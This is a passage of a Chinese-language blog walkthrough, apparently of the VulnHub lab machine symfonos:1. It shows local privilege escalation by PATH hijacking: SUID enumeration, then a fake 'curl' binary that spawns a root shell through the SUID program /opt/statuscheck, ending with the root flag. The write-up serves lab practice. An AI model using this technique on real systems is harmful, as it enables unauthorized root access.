<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h5 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/opt/statuscheck</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br></pre></td></tr></table></figure>



<h5 id="statuscheck"><a href="#statuscheck" class="headerlink" title="statuscheck"></a>statuscheck</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/statuscheck</span><br><span class="line">看不出内容</span><br><span class="line"></span><br><span class="line">file /opt/statuscheck</span><br><span class="line">/opt/statuscheck: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4dc315d863d033acbe07b2bfc6b5b2e72406bea4, not stripped</span><br><span class="line"></span><br><span class="line">strings /opt/statuscheck</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">__libc_start_main</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_Jv_RegisterClasses</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">curl -I H</span><br><span class="line">http://lH</span><br><span class="line">ocalhostH</span><br></pre></td></tr></table></figure>



<h5 id="劫持环境变量提权"><a href="#劫持环境变量提权" class="headerlink" title="劫持环境变量提权"></a>劫持环境变量提权</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;int main(void) &#123;&quot; &gt; curl.c</span><br><span class="line">echo -e &quot;\tsetgid(0); setuid(0);&quot; &gt;&gt; curl.c</span><br><span class="line">echo -e &quot;\texecl(\&quot;/bin/sh\&quot;,\&quot;sh\&quot;,0);&quot; &gt;&gt; curl.c</span><br><span class="line">echo &quot;&#125;&quot; &gt;&gt; curl.c</span><br><span class="line"></span><br><span class="line">cat curl.c</span><br><span class="line">int main(void) &#123;</span><br><span class="line">        setgid(0); setuid(0);</span><br><span class="line">        execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">helios@symfonos:/tmp$ gcc curl.c -o curl</span><br><span class="line">gcc curl.c -o curl</span><br><span class="line">curl.c: In function &#x27;main&#x27;:</span><br><span class="line">curl.c:2:2: warning: implicit declaration of function &#x27;setgid&#x27; [-Wimplicit-function-declaration]</span><br><span class="line">  setgid(0); setuid(0);</span><br><span class="line">  ^~~~~~</span><br><span class="line">curl.c:2:13: warning: implicit declaration of function &#x27;setuid&#x27; [-Wimplicit-function-declaration]</span><br><span class="line">  setgid(0); setuid(0);</span><br><span class="line">             ^~~~~~</span><br><span class="line">curl.c:3:2: warning: implicit declaration of function &#x27;execl&#x27; [-Wimplicit-function-declaration]</span><br><span class="line">  execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0);</span><br><span class="line">  ^~~~~</span><br><span class="line">curl.c:3:2: warning: incompatible implicit declaration of built-in function &#x27;execl&#x27;</span><br><span class="line"></span><br><span class="line">env</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">env</span><br><span class="line">PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br><span class="line">/opt/statuscheck</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(helios)</span><br></pre></td></tr></table></figure>



<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h5 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/proof.txt</span><br><span class="line">Congrats on rooting symfonos:1!</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/VulnHub/" rel="tag"># VulnHub</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/02/13/XXE%20Lab%201_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" rel="prev" title="XXE Lab 1_VulnHub靶机攻略">
                  <i class="fa fa-chevron-left"></i> XXE Lab 1_VulnHub靶机攻略
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/04/30/symfonos%202_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" rel="next" title="symfonos 2_VulnHub靶机攻略">
                  symfonos 2_VulnHub靶机攻略 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rerestst</span>
</div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  




  





<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
</html>